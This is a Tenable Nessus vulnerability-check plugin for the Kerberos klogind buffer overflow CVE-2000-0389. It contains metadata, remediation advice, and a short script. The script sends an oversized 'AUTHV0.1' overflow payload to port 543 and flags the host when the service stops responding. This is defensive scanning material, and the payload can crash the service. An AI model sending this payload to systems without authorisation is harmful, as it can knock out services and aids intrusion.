#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10411);
 script_version("$Revision: 1.17 $");
 script_cvs_date("$Date: 2016/11/19 01:42:51 $");

 script_cve_id("CVE-2000-0389");
 script_bugtraq_id(1220);
 script_osvdb_id(1339);
 script_xref(name:"CERT-CC", value:"CA-2000-06");
 
 script_name(english:"Kerberos klogind Remote Overflow");
 script_summary(english:"Attempts to overflow klogind");
 
 script_set_attribute(
  attribute:"synopsis",
  value:"The remote Kerberized service may be susceptible to a buffer overflow attack."
 );
 script_set_attribute(
  attribute:"description", 
  value:
"The remote klogind seems to be affected by a buffer overflow
vulnerability involving its 'krb_rd_req()' library function that may
also affect other Kerberos-related programs. 

An attacker may use this to gain a root shell on this host."
 );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://seclists.org/bugtraq/2000/May/189"
 );
 script_set_attribute(
  attribute:"solution", 
  value:
"If using the Kerberos distribution from MIT, upgrade to Kerberos 5
version 1.2.  Otherwise, contact the vendor for an update."
 );
 script_set_cvss_base_vector("CVSS2#AV:L/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/05/16");
 script_set_attribute(attribute:"patch_publication_date", value:"2000/05/16");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/05/18");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_dependencie("find_service1.nasl");
 script_require_ports(543);
 exit(0);
}



port = 543;
if(get_port_state(port))
{
  r = raw_string(0) + 
  	 "AUTHV0.1" + 
      raw_string(0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
		   0x00, 0x00, 0x04, 0xB0, 0x04, 0x08, 0x01)
		    +
	crap(1226);
	

#
# Check for a tcpwrapped klogind
#
r1 = raw_string(0) +  "AUTHV0.1" + raw_string(0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
		   0x00, 0x00, 0x04, 0xB0, 0x04, 0x08, 0x01);
	
soc = open_priv_sock_tcp(dport:port);	
if(!soc)exit(0);

send(socket:soc, data:r1);
rcv = recv(socket:soc, length:1024, min:1);

	   
if(rcv)
{
 soc = open_priv_sock_tcp(dport:port);	
 send(socket:soc, data:r);
 r = recv(socket:soc, length:1024, min:1);
 if(!r)
  {
  security_hole(port);
  }
 }
}
